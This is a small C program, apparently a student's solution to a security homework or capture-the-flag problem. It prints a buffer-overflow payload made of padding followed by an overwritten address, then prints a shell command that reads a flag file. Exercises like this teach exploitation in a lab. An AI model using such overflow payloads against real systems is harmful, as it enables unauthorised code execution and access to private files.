/* 
 * Attack 04 - Fill out this program to implement your attack for Problem 4
 */

#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[])
{
  char attack [] = "AAAABBBBCCCCDDDDEEEE\x30\x70\x75\x47";
  char command [] = "cat /home/flags/hw02/flag04.txt > flag04.txt";
  puts(attack);
  fflush(stdout);
  sleep(2);
  puts(command); 

  return 0;
}
